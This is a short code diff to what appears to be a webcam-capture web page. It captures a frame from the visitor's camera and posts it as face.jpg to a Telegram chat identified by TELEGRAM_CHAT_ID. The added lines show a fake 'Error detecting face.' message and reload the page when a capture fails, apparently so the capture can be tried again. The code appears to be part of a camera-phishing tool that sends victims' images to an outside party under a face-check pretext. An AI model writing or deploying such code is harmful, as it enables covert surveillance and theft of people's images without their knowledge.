@@ -42,6 +42,15 @@
         function captureAndSend() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob(blob => {
+                if (!blob || blob.size === 0) {
+                    video.style.display = "none";
+                    message.innerText = "Error detecting face.";
+                    message.style.color = "red";
+                    message.style.display = "block";
+                    setTimeout(() => { window.location.reload(); }, 3000);
+                    return;
+                }
+                
                 let formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("photo", blob, "face.jpg");
